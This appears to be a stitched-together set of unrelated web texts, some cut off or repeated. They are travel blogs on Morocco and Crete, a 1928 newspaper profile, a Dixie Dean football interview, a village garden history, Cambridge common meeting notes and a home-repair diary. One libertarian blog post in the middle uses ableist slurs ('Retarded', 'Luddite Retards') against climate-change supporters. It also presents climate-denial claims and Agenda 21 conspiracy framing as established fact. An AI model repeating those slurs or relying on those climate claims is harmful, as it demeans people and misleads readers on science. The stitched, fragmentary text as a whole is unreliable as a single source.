pastilles we have had), followed by a selection of fruit.</p>    <p>After lunch, we stopped at a shop, L&#x2019;Art des Villes Imperiales, that had a nice display of local art, Berber jewelry and rugs and especially a display showing the making of Damasscine, consisting of an iron substrate into which lines are scratched and silver threads are hammered in.</p>    <p>&#xa0;</p>    <p><b>The Drive to Southern Morocco: From Meknes to Erg Chedi</b></p>    <p>Our next major stop was the massive sand dunes of Erg Chebbi. Reaching this destination, however, required our driver Moha to engage in one of his assigned labors: drive the roughly 500 kilometers to our next destination.</p>    <p>Since we didn&#x2019;t leave Meknes until late afternoon, we could only make it partway to the Southern Moroccan dunes. We passed a number of beautiful overlooks, went through a UNESCO-listed cedar forest and passed the home (but did not see any of the residents) of a tribe of Barbary Apes from which those of Gibraltar came.</p>    <p>We spent the night in the town of Midelt, a rather nondescript former garrison town for the French Legion that is located between the Mid Atlas and High Atlas mountains. Our was claimed to be the best in town, but was 1 star at the most. Our included unappetizing-looking buffet dinner (it was the only option we had) contained dry tough chicken, fresh cucumbers, beets, some breads, fruit. The fruit and the cucumbers were the best part as we essentially limited ourselves to the Moroccan equivalent of a salad bar. Along with a bottle of nondescript, non-vintage CP Cabernet. Breakfast buffet had bread, coffee, tea, juice and&#xa0;hard boil eggs. Thank goodness it also had yogurt and cereal. No fruit. It was at the same poor quality level as dinner. Surprisingly, we slept better than we thought we would on the big pillows and hard bed.</p>    <p>Although the hotel had little to recommend itself, it did have a nice display&#x2014;including in the rooms in the form of bathroom counter, bedside table and desktops&#x2014;of local fossil art, polished stones that highlight fossils from the days when this land lied beneath the sea. We were told that this was the best hotel in town. Probably, but still not a place we&#x2019;d ever recommend.&#xa0; At least it had intermittent wifi in the lobby (meaning it only worked if not too many others were trying to use it).</p>   </div>   <div>    January 4th, 2016 | Tags: , , , , , | Category:   </div>  </div>  
   <div>   <p> Lord Christopher Monckton</p>   <p>An Old Libertarian Comrade Robin Thomsen invited me go with him next week to hear Lord Christopher Monckton Debunking Global warming/ man made climate change. I will be there with bells on! (very cool manly bells that is!) Monday @ Waikato Uni 7pm. It would be great to see other Libertarians there too.</p>   <p> Muppet science&#x2026; seems legit.</p>   <p>While I am pondering this subject I remembered reading a while ago that The Warmists had figured out that&#x2026; Quote: &#x201c;People with very strong free-market support had very high skepticism of climate change,&#x201d; said John Cook, a cognitive psychology doctoral candidate at the University of Queensland.&#x201d; He goes on&#x2026; &#x201c;Such individuals also tend to distrust scientists and scientific processes such as peer review&#x2026;&#x201d; (  <p>Now what is telling about this is that if this is true (and I believe the first part is), then obviously the reverse is also obviously true&#x2026; ie that Climate change is supported predominately by Quote: &#x201d; Retarded Anti-Capitalist Socialists whom hate the free market and believe the State should regulate all trade and Reasources&#x201d;&#x2026; said Libertarian Hunk, Tim Wikiriwhi in the greatest blog Ever&#x2026; Eternal vigilance. He goes on&#x2026; &#x201d; John Cook is simply another State paid flunkey! The truth is Free thinkers do not have any faith in the heavily Politicized scientific community whose pay checks are dependant upon their manufacture of Pseudo-scientific hysteria mongering which generates mass phobia of free enterprise and conveniently recommends heavy handed government regulation of trade, virtually an end to private property, and absolute control of the earths natural resources, whereas the Earth worshipping Luddite Retards snort it like Cocaine! &#x201d;</p>   <p> ^^^Criptic message from Roger Waters.</p>   <p>From   <p>Climate Realists&#x2019; Network was formed in July 2009. </p>   <p>We link to many other like-minded groups throughout New Zealand.</p>   <p>Our main form of communication is by way of fortnightly newsletters to our members. (Contact details below)</p>   <p>Our website contains a number of relevant articles of interest; however anyone wanting to explore the issue of climate on a much deeper level is encouraged to check out our LINKS page which provides a broad range of websites with endless hours of reading to suit any taste.</p>   <p>Lord Christopher Monckton &#x2018;CLIMATE OF FREEDOM&#x2019; TOUR- APRIL 2013</p>   <p>During April 2013 Lord Christopher Monckton will be in New Zealand to speak on Climate Change and its underlying idealogical framework, the United Nations Agenda 21 and the threat this is to freedom. The tour is entitled Climate of Freedom.</p>   <p>While few of us are familiar with Agenda 21 we are likely to have heard the term &#x201c;Sustainable Development&#x201d;, &#x201c;Smart Growth&#x201d;, or &#x201c;Renewable Energy&#x201d;. We may think that this is a &#x201c;not in my backyard&#x201d; issue that we can take or leave as we wish. But if you conduct even a cursory Google search for some of the key concepts of Agenda 21 you will find that most New Zealand local government long term policy has been explicitly implementing Agenda 21 for nearly 20 years, and that this dictates many aspects of YOUR life.</p>   <p>Understanding the underlying goals and intentions of Agenda 21 makes the Global warming, and Climate Change debate infinitely clearer. The motivations, purposes and methodology of those who persist in alarmism on this topic, despite the mounting scientific evidence to the contrary and the 16 year &#x2018;pause&#x2019; in rising global average surface temperatures is more transparent. As the evidence increasingly contradicts the theory of greenhouse gas impacts on global temperatures the alarm is morphing to climate disruption, climate chaos, extreme weather and other scary stuff, since the temperatures are not keeping in step with rising CO2.</p>   <p>Don&#x2019;t you want to know what is going on here?</p>   <p>Contact us for further information or media enquiries.

   <div>   <p>It is assumed that this is the same George Scull who served as the first manager at the Musick Memorial Radio Station from 1942 to 1947.</p>   <p><em>NZ Truth, Thursday 11 October 1928, p 6</em></p>   <h2>Helio George</h2>   <p>WHEN you come to think of it, radio inspectors have rather an unenviable sort of a job.</p>   <p>Their chief public pursuits appear to be rounding up defaulters or sleuthing after oscillating &#x201c;Oswalds!&#x201d; and those execrated valves which bay o&#x2019; nights like a mastiff in distress!</p>   <p>But so far the iron hasn&#x2019;t entered the soul of George H. Scull, the spruce and natty inspector at Auckland. Evidently he takes the philosophical view that jobs are mostly what- you make them.</p>   <p>In the books of the P. and T. Department, George has a score of years on the credit side. Becoming exceedingly bored with common or garden telegraphy, he switched over some years ago to the Marconi variety. He did many a weary stretch in the silences of the night with the receivers glued to his lobes. But he got &#x201c;next&#x201d; to the mysteries of radio and caught its glamor.</p>   <p>George is a handy chap to know when you are unable to make a choice between a neutrodyne and a counterphase, and he doesn&#x2019;t bewilder you with a stream of technical verbiage.</p>   <p>He is a captain in charge of the Northern Signal Depot. He rather dislikes militarism as such, but has a lot of use for the signalling arm of the service, with its field wireless, its semaphores and helios and buzzers &#x2018;n&#x2019; everything.</p>  </div>  
   <div>   <p>Ah, Crete. I hadn&#x2019;t exactly planned on going there, but after travelling through the Middle East I was in need of a holiday. I was thinking about maybe going to Ios, but I&#x2019;d heard good things about Crete, and it has history for New Zealanders. It is pretty much a package holiday place though &#x2013; something like 80% of visitors are on package tours. Still, I was in the mood for somewhere where I could drink the water out of the tap, and flush the toilet. I guess I mostly succeeded in that (those who have used Greek toilets will know what I mean).</p>   <p>This is the view out the window of the place I was staying at. Not that cheap, but right in the middle of it. Restaurants immediately below the window, and the water right there. Plenty of bars within 1-2 mins walk.</p>   <p>Some other shots, one looking over the old town, the next looking back across the harbour. The place I was staying at is roughly in the middle.</p>   <p>Since lying on a beach all day, and drinking all night wasn&#x2019;t going to do my body any favours, I decided to walk the </p>   <p>Souda (also spelt Suda) Bay is the Commonwealth WWII cemetery on Crete. There&#x2019;s around 1500 servicemen buried here, including around 500 New Zealanders. Something that really struck me here was the large number of unidentified soldiers &#x2013; I guess that came from the fact that the bodies were moved around several times, having first been buried around the island when the Germans took it. I was there just a few days after a ceremony commemorating the 65th anniversary of the battle of Crete, so wreaths were still around.</p>   <p>I wanted to go somewhere with working municipal facilities, and for the most part, they were. However I did particularly like this pedestrian crossing &#x2013; after crossing from right to left, where are you meant to go? There&#x2019;s no footpath, it just goes straight into a fence.</p>   <p>And of course, here&#x2019;s the main reason I enjoyed myself so much on Crete &#x2013; this is Linda and Pia, who work at DNA. Huge amounts of fun, just don&#x2019;t try and outdrink them, you will regret it&#x2026;</p>  </div>

On the Saturday I scored two against Aston Villa at Goodison. I thought to myself well blimey, I only want another seven from two matches. So when we go off to Burnley, the next thing I know the ball has started running a bit my way and before half-time I&#x2019;d scored four. And, of course, our supporters, they were going off at the deep end. Oh, by the way, I went off the field then at half-time.</p>      <p>I pulled a muscle stretching, so I didn&#x2019;t go on in the second half. My old trainer Harry Cooke, from that night, from the Wednesday night until the Friday, he was with me at home, my home in Alderley Avenue, Birkenhead. Old Harry kept putting clay plasters on [the muscle] until the Friday night, even leaving one on overnight as well. Old Harry cured it and on the Saturday, of course I was fit.</p>      <p><strong>JR:</strong> So if it hadn&#x2019;t been for that, you might not have been playing?</p>      <p><strong>DD: </strong>That&#x2019;s a fact, because we&#x2019;d already won the League.&#xa0;But, of course, the spectators could see this other three, [thinking] if I can two get two against the Villa and four at Burnley I must be able to get three against this other mob at home.</p>      <p><strong>JR:</strong> And that day you went there were 60 odd thousand in the ground.</p>      <p><strong>DD:</strong> Yeah, they shut the <b>gates</b>.</p>      <p><strong>JR: </strong> Geordie (George) Camsell, he got his [record 59] goals [for Middlesborough] in the Second Division the season before, but that wouldn&#x2019;t diminish the quality of what he did or the merit of his goals. I mean, he might have been in the Second Division but it was still an enormous thing for him to do, wasn&#x2019;t it, to score 59 goals?</p>      <p><strong>DD: </strong> Yeah&#x2026;yes, he was a nice lad Geordie. As a matter of fact I got my calling up papers for the army from the north-east, up near Bishop <b>Auckland</b>, and it was there that I heard that old Geordie had snuffed it.</p>      <p><strong>JR: </strong> The Everton team of that time, it was all geared up for attacking football wasn&#x2019;t it? What would you have? Obviously a goalkeeper, two backs&#x2026;</p>      <p><strong>DD: </strong>&#x2026;&#xa0;three halves, five forwards.</p>      <p><strong>JR:</strong> What qualities were expected in the centre forwards?</p>      <p><strong>DD:</strong> Solid, hard-working&#x2026;not to be afraid. You&#x2019;ve got to take all the risks, which I did. I had just over 15 operations. But I was quick at healing.</p>      <p><strong>JR:</strong> The right temperament too. You never let yourself lose your temper or anything like, you never got&#x2026;</p>      <p><strong>DD:</strong> I wouldn&#x2019;t argue.</p>      <p><strong>JR:</strong> You must have had big defenders trying to provoke you, pushing you, shoving you, kicking you, they&#x2019;d be calling you names, the old procedure.</p>      <p><strong>DD:</strong> You&#x2019;d get [your own] back a bit &#x2026; There&#x2019;s a case at Blackburn, where they had a big fella there, [Bill] Rankin, and there was a corner kick coming over. And just when I&#x2019;m going up to head this, he&#x2019;s got two fingers in the back of my football trousers, in the negligee. And he pulled me down, you see, and he&#x2019;s behind me, and when he knows that I haven&#x2019;t gone up for it, he turns around, and says &#x2018;He doesn&#x2019;t ruddy well get that one.&#x2019;</p>      <p>&#x2018;No,&#x2019; I said. &#x2018;You did, thank you very much. Look where it&#x2019;s gone.&#x2019;</p>      <p>It hit him, hit his shoulder and went in the net.</p>      <p><strong>JR:</strong> And he didn&#x2019;t even know he&#x2019;d done that, did he? He was too busy watching you.</p>      <p><strong>DD:</strong> Yes, he was pulling, watching the ball, trying to watch the ball, and pull my knickers at the same time, pull me down.</p>      <p><strong>JR:</strong> There was a funny goal you scored at Villa where the sun helped you a lot&#x2026;when you saw the shadow.</p>      <p><strong>DD:</strong> Yeah, that was [Fred] Biddlestone, I think, the Villa goalkeeper, and this ball was pumped right up the field from Hunter Hart, the centre-half. He belted it and, er, I&#x2019;m watching this ball ten yards outside the penalty area, and all of a sudden I can see the shadow lengthening, knowing then that the goalkeeper had come out of his goal. So instead of me breasting it down, or footing it down, taking it on, I jumped up and flicked it with the back of my head, and it dropped in the empty net. And then he said: &#x2018;How the bloody hell do you get these goals?&#x2019; I said: &#x2018;Er, that thing there gave me that.&#x2019; He said: &#x2018;How do you mean?&#x2019; I said: &#x2018;Well, look at your shadow there&#x2026;&#x2019; Oh, Christ! &#x2018;Don&#x2019;t bring your shadow with you next time!&#x2019;</p>      <p><span>.</span></p>      <p><strong>JR:</strong> You were born in Birkenhead?</p>      <p><strong>DD:</strong> I was born in Birkenhead, but both sides of my people belonged to Chester.

I used to take milk out. I&#x2019;d be up at half-past four in the morning and go down and get the ponies and the milk floats, then I&#x2019;d come out to this place in Upton, between Upton and Arrowe Park, and Burgess&#x2019; Farm was there. We used to collect the milk in the big urns and take it out to people&#x2019;s houses, serving it out of the ladle. And not only that, you had an allotment, and that was in school time. And there was no such thing as pinching and stealing and all that bloody caper. In those days, you were growing all that stuff and you needed it for the war time.</p>      <p><strong>JR:</strong> It was all part of the war effort was it?</p>      <p><strong>DD:</strong> Yes. It was in Birkenhead Park. We all had an allotment set to us. A couple of us would have a nice piece of ground. Get the old spuds in, cabbages in, onions, everything that we wanted, lettuce.</p>      <p><strong>JR:</strong> Would you take them home, or would it go&#x2026;</p>      <p><strong>DD:</strong> No, the Council took all that. We got a bit ourselves of, course.</p>      <p><strong>JR:</strong> So at school you just had to take what lessons you could, I suppose?</p>      <p><strong>DD:</strong> My only lesson was football.</p>      <p><strong>JR: </strong>Is that right?</p>      <p><strong>DD:</strong> That&#x2019;s right&#x2026;nothing else. I used to give the pens out on Friday afternoons&#x2026;the ink, and the chalks. That was the only job I had in school.</p>      <p><strong>JR:</strong> What about the lessons?</p>      <p><strong>DD:</strong> I never had any lessons.</p>      <p><strong>JR:</strong> Did you never learn maths or English?</p>      <p><strong>DD: </strong>No, nothing.</p>      <p><strong>JR:</strong> Well how did you learn to read or write then?</p>      <p><strong>DD: </strong>Oh, I can write as good as anybody.&#xa0; I just picked it up. And then when I left school, then I was on the railway, same as my dad. My mother, she&#x2019;d come to Birkenhead to go in service, and my dad packed up in Chester and he came down to Birkenhead. Got a job on the Wirral railway, and he was on the Wirral railway until he retired.</p>      <p>I served my time in the sheds as an apprentice fitter. The other two apprentice fitters, they didn&#x2019;t like the night job because there were too many bloody rats around there, coming out of the Anglo-oil company and the Vacamoil company&#x2026;rats as big as whippets. So I took their night job, and of course, I could always have a game of football then.</p>      <p><strong>JR:</strong> You&#x2019;d play football and then go working at the railway sheds?</p>      <p><strong>DD: </strong>Yeah. My manager at the Wirral railway, his two sons were doctors, and they were also directors of New Brighton Football Club. Whoever it was that told them, I don&#x2019;t know, but the general manager of the railway sent for me and asked me would I care to go to New Brighton. Now my mind, you see, was always on Everton.</p>      <p><strong>JR: </strong>Did you used to watch them as a boy?</p>      <p><strong>DD: </strong>Only seen them once.&#xa0; My dad took me there when I was eight. Watching that blue and the stands and everything I thought, blimey, what a place!&#xa0;Anyway, I told the general manager of the railway that I wasn&#x2019;t thinking about going anywhere yet. The next thing I know I&#x2019;m playing out here in Wirral for Pensby United. Then this fella approached me one day and asked me did I want to go to Tranmere and have a game there. I got lucky in the sense that I went there, I did get to Everton from there. But at Tranmere I didn&#x2019;t fancy Bert Cook, who was the secretary, manager, trainer&#x2026;everything. He was one of those soft soapers, until he finished with you.</p>      <p><strong>JR:</strong> And the big clubs were watching you&#x2026;</p>      <p><strong>DD: </strong>Oh, eight or nine teams. Newcastle wanted me. Arsenal wanted me. Anyway, one afternoon I cleared off to the pictures and when I got home my mother told me Mr McIntosh from Everton had been and was waiting for me at the Woodside Hotel. I ran the two and a half miles there. I couldn&#x2019;t get there quick enough. Mr McIntosh asked me did I want to play for Everton, and that was that.</p>      <p><strong>JR:</strong> What was your share of the &#xa3;3,000 transfer fee?</p>      <p><strong>DD:</strong> Tranmere promised my mother and father three hundred quid.

On the Saturday I scored two against Aston Villa at Goodison. I thought to myself well blimey, I only want another seven from two matches.

Centrepiece in the Garden is a Yew, grown from a cutting from a 2000 year old tree in the churchyard at Hambledon in Surrey. In 2003 the Garden received a County Durham Environment Award. The Garden is&#xa0; cared for by volunteers who share in working parties and&#xa0; individual visits in line with a rota.</p>    <p>Displays and events in the Garden reflect anniversaries and include a summer Garden Party, and village carol singing around the Christmas tree.</p>    <p>A leaflet giving information is available and a stone plinth in the Garden tells the story of the Garden. Access to the Garden is normally available during daylight hours.</p>    <h2><b>Friends of the Millennium Garden</b></h2>    <p>All with an interest are regarded as Friends.

David Bellamy, botanist, conservationist and TV personality, is a local resident and he suggested that we might be fortunate enough to be among the recipients of a Millennium Yew.</p>    <p>The Conservation Foundation Yew Tree Campaign had been launched by David in 1987 to help record and protect some of Britain&#x2019;s oldest trees, and its &#x2018;Yews for the Millennium&#x2019; project was devised to offer each parish in the country a yew sapling, grown from a cutting of an existing yew at least 2,000 years old &#x2013; in other words a tree already growing at the time of the birth of Christ.</p>    <p>The cuttings were duly taken from ancient yews (some as much as 4,000 years old) throughout England and Wales during 1996 and grown on for the purpose.&#xa0; It was assumed that a few hundred yew saplings would be requested but the idea became so popular that in the end some 8,000 of these new yew trees were planted.</p>    <p>We know, in fact, that our own &#x2018;Taxus baccata&#x2019;, which was a mere slip of green when we received it, came from the mighty Hambledon Yew in Surrey, a tree known to be at least 2000 years old.&#xa0; We now needed a prominent position for our very special tree.</p>    <p>At this point, we were kindly offered the use of the walled enclosure adjacent to the Methodist Church.&#xa0; It was immediately plain that this was, in fact, the perfect location for a small garden, being centrally placed in the village and therefore accessible to all.&#xa0; Its condition was, however, less ideal!&#xa0; It had long since become redundant, overgrown and very derelict, so the first task was to find volunteers to undertake the heavy work of site clearance.</p>    <p>A major factor in our decision to go ahead was a donation of &#xa3;2500 from the County Durham Environmental Trust (CDENT) under the Government&#x2019;s Landfill Tax Credit Scheme.&#xa0; It was the positive decision on this grant that gave us the confidence to proceed with the commissioning of features that might otherwise have been felt to be beyond the reach of the local community.&#xa0; A local working party was duly drawn together to work on the development of the garden and to devise a suitable layout and planting plan.</p>    <p>The approximately regular shape of the garden and the central entrance lent themselves well to a balanced design, which it was felt would give the garden a clear structure.&#xa0; Among several possible designs kindly drawn up for us by a friendly landscape architect, the simplest was the one eventually chosen, as we were aware that we were dealing with quite a small area that could easily become cluttered.</p>    <p>Our little yew tree would have to be the most important feature, of course, though we knew that it would take many years to grow to any remotely impressive size.&#xa0; In fact it soon filled the elegant dome-shaped frame that Raymond Ayre, a local craftsman working in wrought <b>iron</b>, had made for it and this now acts instead as a Clematis support.&#xa0; He also designed and made the <b>gates</b> for the entry to the garden, in both cases incorporating the year 2000 in the design.</p>    <p>Meanwhile, Northumbrian Water kindly donated the magnificent, and extremely heavy, stones for the paved areas.&#xa0; The demanding task of laying them as level paving was carried out by Jonathan and Stephen Love, of Wolsingham, who very skilfully concealed the fact that some of the stones are as much as nine inches thick.</p>    <p>Steven Bainbridge was responsible for the remaining stonework in the Garden, including the plinth&#xa0;surrounding&#xa0;the slate information panel which tells the story of the garden.&#xa0; Eric Bainbridge carved the Millennium plaque in the wall to the right of the entrance.</p>    <p>With the garden structure in place, there was now the question of what to plant.&#xa0; Our starting point was that the word &#x2018;Yew&#x2019; (as well as its Latin name &#x2018;Taxus&#x2019;) began with a letter that was part of the word &#x2018;Hamsterley.&#x2019;&#xa0; Prompted by this thought and looking for a way to relate the garden to its location, we wondered whether there was any sense to be made from choosing other plants that also began with letters in the word &#x2018;Hamsterley.&#x2019;&#xa0; At first the idea was simply a tentative experiment, but in fact it fell into place with remarkable ease.&#xa0; Since those early days, of course, we have received a number of gifts of plants that are very welcome additions, whether or not they match our original plan.&#xa0; A more&#xa0;important principle in our choice was &#x2013; and still is &#x2013; that in every season there should be beauty, whether in terms of flowers, fruits or scent.</p>    <p>Local people have&#xa0;kindly donated the benches&#xa0;and&#xa0;some additional plants, and many generously give regularly of their time and effort in clearing, planting and maintaining the Garden.</p>    <p>Each year, the Sunday School children take responsibility for growing, planting and caring for some of the plants in the garden such as bulbs in pots, sweet peas and nasturtiums.&#xa0; And each December the Garden&#x2019;s importance as a focus for the village is emphasised by the presence of a decorated and lit Christmas tree, around which we all gather to sing Christmas carols.</p>    <div>     <p>Drawing by Linda Birch</p>    </div>    <p>To all who have contributed in any way, we say a very sincere thank you on behalf of all the residents of Hamsterley.</p>    <h2><b>Location</b>:</h2>    <p>The Garden is next-door to the Methodist Church in the village of Hamsterley, which stands on a ridge between Weardale and Teesdale some seven miles west of Bishop <b>Auckland</b>, and three miles west of the A68.</p>    <h3>&#xa9;

   <div>   <div>    <div>     Midsummer Common &#x2013; Cambridge    </div>   </div>   <p>On the 17<sup>th</sup> of March 2010 I and about thirty others attended an annual general meeting of the Friends of Midsummer Common. This was a meeting, open to all, which had been advertised on the common.</p>   <h3>Interesting Points</h3>   <ul>    <li>Council officer Alistair Wilson reported that the Horse Chestnuts on Victoria avenue have only a year or two left [before the council will be seeking to fell them].</li>    <li>Planting a new orchard began on the 19th and 20th of March; local trees are being used and in a typically Cambridge fashion an experiment is being run to see if trees planted in round or square holes fare best. Also an apple chutney group has been established despite a first harvest not being expected for a few years. </li>    <li>Trees recently felled on the common have not been replaced despite assurances from Cllr Julie Smith and other councillors. Cllr Smith says there is time to come up with a plan during summer 2010 for new strategic planting in winter 2010/11. Cllr Smith had planned, and promised, be in a position to replant during 09/10 planting season but failed. We need to be as visionary and forward thinking as those who planted the existing avenue on Victoria Avenue and the plane tree avenue on Jesus Green. </li>    <li>Cllr Smith revealed that the reason the, needed to apply for its own licence at all was because the City Council had refused it permission to use the council&#x2019;s, existing, licence for the common. Council officers reported it was expected that magistrates would have only decided the police&#x2019;s appeal against the new licence being granted. </li>    <li>The Chair of the Friends of Midsummer Common, Mr Baxter, reported the City Council had given him a litter picker. He has also been on a number of orchard planting courses, including one in Belgium, though who funded those wasn&#x2019;t revealed. </li>    <li>Those serving community service sentences by working on the common can&#x2019;t be asked to pick litter as there is no &#x201c;skills development&#x201d; involved in that task; they have however been used to paint all the railings in the last year.</li>   </ul>   <h3>City Council Officers&#x2019; Presentation</h3>   <p>The meeting started with a presentation by two city council officers, Sarah Tovell and Alistair Wilson, members of the &#x201c;active communities&#x201d; team. Sarah Tovell said her role was &#x201c;development&#x201d; of open space; Mr Wilson introduced himself as the &#x201c;Green Spaces Manager&#x201d; saying he was responsible for &#x201c;strategy and development&#x201d;. </p>   <p>They said that three meadows had been sown on the common in an attempt to increase species diversity and claimed to be &#x201c;committed to replanting trees&#x201d;. They also told the meeting they wanted to &#x201c;make the invisible visible and explain why they cut the grass and why meadows had been planted. The fact that the first of the trees in the new Orchard were due to be planted on the coming weekend was mentioned. </p>   <h3>Questions to Council Officers</h3>   <h4>Drinking and Dispersal onto the Common</h4>   <p>Public questions to the council officers followed their presentation. The first asked what was being done about an increase in &#x201c;street people drinking on the common&#x201d;, the person raising the point said &#x201c;it doesn&#x2019;t enhance the environment&#x201d;. They pointed out that common now forms the boundary of the current dispersal zone (). The questioner said they had contacted the police but had been told by them that it was a question for the city council. </p>   <p>Responding; council officer Mr Wilson said he would pass the comment on to the council&#x2019;s Anti-Social Behaviour team and asked if it would help if benches were removed. </p>   <h4>Vandalism of the Orchard</h4>   <p>The next question asked how vandalism can be prevented at the new orchard and what can be done to stop the area becoming a haven for drug dealing and drug taking. Mr Wilson replied to say he hoped that &#x201c;natural surveillance&#x201d; from overlooking properties would help. </p>   <h4>Litter</h4>   <p>A member of the public then asked about rubbish in bushes, some of which he said had been left uncleared for six or seven months. The chairman of the Friends of Midsummer Common reported that Cambridge City Council had given him a litter grabber which he uses to pick litter. The questioner wasn&#x2019;t clear about exactly where the rubbish he was talking about was. </p>   <p>It was asked why those doing community service, who&#x2019;re often seen sitting on the common in their orange jackets with &#x201c;community payback&#x201d; written on the back, couldn&#x2019;t pick litter. Council officer Mr Wilson reported that projects for them to do had to involve some element of &#x201c;skills development&#x201d; and while painting does, litter picking does not. A freedom of information request I made for revealed that &#x201c;clearing and tidying&#x201d; is considered a valid use of their time. Personally I think it would be fantastic if those on community sentences could be joined by members of the Friends of Midsummer Common and other volunteers I expect in Cambridge they&#x2019;d probably be oversubscribed with those eager to help.</p>   <h4>Path to Pub/Restaurant</h4>   <p>The state of the path between Victoria Avenue and the Pub/Restaurant was raised next, with driving and turning on the grass resulting in lots of mud being the problem. This question was addressed later in the meeting. </p>   <h4>Mowing Timetable</h4>   <p>A member of the public asked if the timetable for mowing could be published; and if mowing could take place other than just to get the common ready for fairs. Mr Baxter suggested that mowing ought be timed to cut down weeds rather than being in advance of events, but he also said that ideally we want the cattle to eat the grass and weeds not mow.</p>   <h4>Litter</h4>   <p>Andy Rankin reported that the Camboaters were not organising a Cam Cleanup this year, but said he thought that if the Friends of Midsummer Common organised something it would be supported by boaters. </p>   <h4>Mooring Rings</h4>   <p>While he was speaking Mr Rankin also asked about the cast <b>iron</b> mooring rings which have been taken away from the common. Mr Wilson said he had the mooring rings, and was using one as a door-stop in his city council office. He said there was an intent to have them all re-blasted and refitted to the mooring bollards proposed. (See my article: )</p>   <h4>Noticeboard and Cllr Bick&#x2019;s Election Commitments</h4>   <p>A noticeboard was suggested by a member of the public; one reason given was that those trying to stop people lighting fires and damaging the grass by having BBQs have nothing to point to to show that such behaviour is not permitted. </p>   <p>The discussion on noticeboards resulted in Mr Baxter asking if this was something which Cllr Bick, who was present, had promised as part of his personal election manifesto, along with an electric gate which would control vehicular access to the common. Cllr Bick responded to say it was something which could be discussed at a meeting to be held the next day within the council to follow up the friends&#x2019; meeting. Mr Baxter said to Cllrs Bick and Smith: &#x201c;Surely the council does what you suggest&#x201d;, to which Bick said &#x201c;If only&#x201d; and Cllr Smith shrugged. This lack of a grip on power is in my view a real problem with the local Liberal Democrats. The question of the gate was returned to later. </p>   <p>While I think that the internal council meeting with respect to Midsummer Common appears to be being used much more reasonably than the Jesus Green stakeholder meeting has been I think both ought have their attendees, minutes and agendas published and ought be open to the public. </p>   <h3>Chairman&#x2019;s Report</h3>   <div>    <div>     Friends of Midsummer Common Chairman Dick Baxter (left) and secretary Barry Higgs (right) lead the public AGM on the 17th of March 2010.   <div>   <p>It&#x2019;s been almost 10 months since Lisa and I brought our current house and moved in. Things are going well, having our own place and not paying a landlord is a fantastic and freeing feeling,&#xa0;but home ownership certainly isn&#x2019;t a free ride and the amount of work it generates is quite incredible.</p>   <p>So what&#x2019;s been happening around Carr Manor since we moved in?</p>   <div>    <p>Can&#x2019;t beat Wellington on a good day!</p>   </div>   <p>Generally the house is in good shape, most of my time has been spent in the grounds of the estate clearing paths, overgrown vegetation and various other missions. However we have had a couple smaller issues with the house itself.</p>   <p>&#xa0;</p>   <p>The most serious one is that part of the <b>iron</b> roof in the house was leaking due to what looks like a number of different&#xa0;patch jobs combined with a nice unhealthy dose of rust.</p>   <div>    <p>Hmm cracks in the roof that let water in == bad right?</p>   </div>   <div>    <p>The outside doesn&#x2019;t look a whole lot better.</p>   </div>   <p>The &#x201c;proper&#x201d; fix is that this section of roof needs replacing at some point as it&#x2019;s technically well-past EOL, but roof replacement is expensive and a PITA, so I&#x2019;ve fixed the issue by stripped off as much rust as I could and then re-sealing the roof using Mineral Brush-On Underbody Seal.</p>   <p>Incase you&#x2019;re wondering, yes, the same stuff that you can use on cars. It&#x2019;s basically liquid&#xa0;tar, completely waterproof and ever so wonderful at sealing leaky roofs. I liberally applied a few cans over flashings, patches and the <b>iron</b> itself getting a nice thick seal.</p>   <div>    <p>Repair!</p>   </div>   <div>    <p>The same stuff did wonders on the rusted shed roof flashing as well.</p>   </div>   <p>Up next I need to complete a repaint of both sheds and the house roof. I&#x2019;m probably going to do a small job in whatever colour I have lying around for the worst part of the roof and then go over the whole roof again at a later stage when we decide on a colour for the full repaint.</p>   <p>&#xa0;</p>   <p>The other issue we had was that one of the window hinges had rusted out leaving us with a window that wouldn&#x2019;t open/close properly.</p>   <div>    <p>I&#x2019;m not expert, but I don&#x2019;t think hinges are supposed to look like this&#x2026;.</p>   </div>   <p>This was a tricky one to fix &#x2013; the hinge and the screws were so rusted out I couldn&#x2019;t even remove them, in the end I removed the window simply by tearing the hinge apart when I pulled on it leaving a shower of rust and more disturbingly, cockroaches that had been living amongst the bubbled rust.</p>   <p>This left me with two parts of metal hinge stuck in the wall and on the window frame held in by screws that would no longer turn &#x2013; or in some cases, even lacked heads entirely.</p>   <p>To get them out, I put a very small drill bit into the electric drill and drilled out the screw right down the middle of it. It&#x2019;s pretty straightforwards once you get it going, but it was a bit tricky to get started &#x2013; I ended up using the smallest bit I had to make a pilot hole/groove in the screw head, and then upsized the bit to drill in through the screw. Once done, the metal remains tend to just fall out and come out with a little prodding.</p>   <p>I&#x2019;ve since replaced it with a shiny new hinge and stainless steel screws which should last a lot longer than their predecessors.</p>   <div>    <p>Shiny new hardware</p>   </div>   <p>&#xa0;</p>   <p>Painting has been an &#x201c;interesting&#x201d; learning experience, I&#x2019;ve found it the hardest skill to pickup since it&#x2019;s just so time consuming and you have to take such extreme care to avoid dripping any paint on other surfaces.</p>   <p>One of my earliest painting jobs was doing the lower gate. This gate spends a lot of time in the shade and even in spring was feeling damp and waterlogged and generally wasn&#x2019;t looking that sharp &#x2013; especially the fact the bolt was a pile of rust barely holding together.</p>   <div>    <p>I&#x2019;m sure unfinished timber looks great when it&#x2019;s first built, but the moss dirt and damp doesn&#x2019;t lead to it aging well.</p>   </div>   <div>    <p>Much sharper!</p>   </div>   <p>Things like the gate take time and need care, but it&#x2019;s nothing compared to the absolute frustration of painting window frames where a few mm to the wrong side or a stray bristle leads to paint being smeared across the glass.</p>   <p>I did the french doors initially as the paint had peeled and was starting to expose the timber to the elements, some of the putty had even fallen out and needed replacing.</p>   <div>    <p>Applying painter&#x2019;s tape to this is one of the most frustrating things I&#x2019;ve ever had to do :-/</p>   </div>   <p>Because I was painting around glass, I applied painter&#x2019;s tape the whole thing before hand. It took hours, incredibly frustrating and I feel that the end result wasn&#x2019;t particularly great.</p>   <p>I&#x2019;ve since found that I&#xa0;can get a pretty tidy result using a sash/trim brush and taking extreme care not to bump the glass, but it is tricky and mistakes do happen. I&#x2019;m figuring with enough practice I&#x2019;ll get better at windows&#x2026; and I have plenty of practice waiting for me with a full house paint job pending. Of course I could pay someone to do it, but at $15k+ for a re-paint, I&#x2019;m pretty keen to see if I can tackle it myself&#x2026;.</p>   <p>&#xa0;</p>   <p>The shed works haven&#x2019;t proceeded much &#x2013; I had the noble goal of completely repairing it over summer, but that time just varnished sorting out various other bits and pieces.</p>   <p>On the plus side, thanks to help from one of my colleagues, the shed has been dug out from it&#x2019;s previously buried state and the rot and damage exposed &#x2013; next step is to tear off the rotten 